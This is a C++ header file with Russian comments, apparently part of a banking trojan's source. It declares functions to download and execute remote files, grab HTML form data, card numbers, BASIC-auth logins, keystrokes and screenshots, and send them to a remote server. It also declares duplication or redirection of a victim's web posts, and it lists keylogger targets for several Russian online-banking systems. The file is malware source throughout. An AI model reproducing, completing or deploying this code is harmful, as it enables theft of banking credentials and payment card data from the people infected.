#ifndef LoaderH
#define LoaderH
//----------------------------------------------------------------------------

#include <WinSock.h>
#include "BotHTTP.h"
#include "BotClasses.h"

typedef struct TSendHTMLData
{
	PCHAR URL;         // Адрес, источник данных
	DWORD BrowserType; // Тип браузера
	PCHAR UserAgent;   // Имя агента
	DWORD DataType;    // Тип отправляемых данных
	PCHAR Data;        // Отправляемые данные
	bool  ContainCard; // Признак того, что данные содержат номер карты
	PCHAR BotID;       // Идентификатор бота

} *PSendHTMLData;




//bool DownloadInternet( char *Url, WCHAR *FileName, DWORD dwFile, LPBYTE *lpMem, LPDWORD dwMemSize  );

bool DownloadInFile( char *Url, WCHAR *FileName );
bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize );


bool MySend( SOCKET Socket, const char *Data, int DataLen );
char **GetRealAddress( char *Host );

//bool WINAPI SendFormGrabberLogs(char *URL, char *Logs, char *UserAgent, DWORD dwBrowser, DWORD dwType );
bool SendFirstInfo();
bool SendTradeInfo( char *Buffer );

char *GetInfoFromBcServer( char *Url );
//bool SendScreen( LPVOID lpFile, DWORD dwFileSize );

bool AsyncDownload( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize );

void SetSBStarted(bool bStartHideJava_SB);
bool GetSBStarted();

bool ExecuteFile( char *Url, WCHAR *FileName );

#define HTONS(x) (((x) << 8) | ((x) >> 8))



//----------------------------------------------------------------------
//	SendRemoteLog - Функция отправляет лог на скрипт удалённого
//				    логирования
//
//  Type - Тип лога
//  Log  - Текстовый лог
//  ScreenShot - Снимок экрана
//  ScreenSize - размер снимка
//  ScreenExt  - Расширение файла скриншота (например ".jpg"). Если не
//               указать то будет использовано ".png"
//----------------------------------------------------------------------
bool SendRemoteLog(PCHAR Type, PCHAR Log, LPBYTE ScreenShot, DWORD ScreenSize, PCHAR ScreenExt);


//****************************************************************************
//  SendGrabberReport - функция отправляет отчёт с полученными данными
//****************************************************************************
bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize);



//------------------------ Обработчики отправки данных ---------------------//

// Событие отправки данных
typedef void (*PSendDataEvent)(PSendHTMLData, // ссылка на отправляемые данные
							   bool&,	      // указание прервать текущую обработку
							   bool&);        // указание прервать отправку данных

// Режим обработки
enum THandleDataMode  {hdmUnknown,   // Режим не установлен
					   hdmDuplicate, // Доблировать на указанный адрес
					   hdmRedirect   // Перенаправлять на указанный адрес
					   };

// Зарегистрировать обработчик отправки
DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL);

//----------------------------------------------------------------------------
/// Функции добавленные при добавлении RuBnk
typedef struct
{
	char *FilePath;
	DWORD dwType;
} BSSINIST, *PBSSINIST;

//#ifdef RuBnkH
//DWORD WINAPI SendBSSInist( LPVOID lpData);
char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved );


//---------------------------------------------------------------------------
//  CheckValidPostResult - Функция проверяет ответ сервера на предет
//                         корректного принятия пост данных
//---------------------------------------------------------------------------
bool CheckValidPostResult(PHTTPResponseRec Response, PCHAR HTMLDocument);


//---------------------------------------------------------------------------
//  Максимальтный размер данных формграбера
//---------------------------------------------------------------------------
#define MAX_FORM_GRABBER_DATA_SIZE 10240


//****************************************************************************
//  DataGrabber - Функции для работы с отправляемыми данными
//****************************************************************************


#define DATA_BLOCK_URL        1
#define DATA_BLOCK_USERAGENT  2
#define DATA_BLOCK_DATA       3
#define DATA_BLOCK_CARDNOMBER 3
#define DATA_BLOCK_APPNAME    4
#define DATA_BLOCK_CAB        5


// Типы отправляемых на сервер данных
#define DATA_TYPE_FORM   1  /* Данные HTML форм */
#define DATA_TYPE_INJECT 2  /* Данные полученные из загружаемых HTML документов */
#define DATA_TYPE_KEYLOG 3  /* Данные кейлогера */
#define DATA_TYPE_CAB    4  /* CAB архив */


// Для совместимости вводим имена известных сестем на которых будет работать
// кейлогер

const static PCHAR KEYLOGSYSTEM_BSS       = "bss";
const static PCHAR KEYLOGSYSTEM_IBANK     = "ibank";
const static PCHAR KEYLOGSYSTEM_INIST     = "inist";
const static PCHAR KEYLOGSYSTEM_CYBERPLAT = "cyberplat";
const static PCHAR KEYLOGSYSTEM_KP        = "kp";
const static PCHAR KEYLOGSYSTEM_PSV       = "psb";



namespace DataGrabber
{
	// Функция возвращает путь к папке хранилища данных
	PCHAR GetRepositoryPath();

	// Функция возвращает уникальное имя файла для хранения данных
	// если указано имя FileName то будет создано имя файла на его
	// основе, в противном случае будет сручайное имя
	PCHAR GetDataFileName(PCHAR FileName = NULL);

	// Функция возвращает имя файла для хранения данных кейлогера
	PCHAR GetKeyLoggerFileName();

	// Функция возвращает пароль, которым будут шифроваться файлы
	PCHAR GetRepositoryPassword();

	// Отправить файл данных на сервер
    bool SendDataFile(PCHAR FileName, bool* InvalidFile);

	// Запустить поток отложенной отправки данных
	void StartDataSender();


	//---------------------------------------------------------------
	// Методы добавления данных в хранилище, для дальнейшей отправки
	//---------------------------------------------------------------

	// Создать файл данных
	PDataFile CreateDataFile(DWORD DataType);

	// Создать файл данных
    void CloseDataFile(PDataFile File);

	// Функция складывает данные в хранилище для последующей отправки
	bool AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType, bool ContainCreditCard);

	// Добавить данные HTML формы
    bool AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType);


	// Функция добавляет данные BASIC авторизации для отправки на сервер
	void AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password);


	//---------------------------------------------------------------
	// Методы отправки файлов
	//---------------------------------------------------------------

	// Отправить данные HTML форм
	bool SendFormGrabberData(PDataFile File);

	// Дополнительные методы отправки
	bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

	//--------------------------------------------------------------
	//  Методы отправки CAB архивов
	//--------------------------------------------------------------
	// Немедленная отправка архива
	bool SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppNamee, bool* InvalidFile);

	bool SendCab(PCHAR CabFileName, PCHAR AppName, bool* InvalidFile);


	// обработчик отложенной отправки
	bool SendСabFromDataFile(PDataFile Fil, bool* InvalidFilee);

	// Отложенная отправка архива
	// функция добавляет файл в очередь отправки и возвращает управление
	// Файл архива дублируется. По этому его можно удалить сразу после
	// вызова функции
	bool SendCabDelayed(PCHAR URL, PCHAR CabFileName, PCHAR AppName);
}


//----------------------------------------------------------------------------
#endif



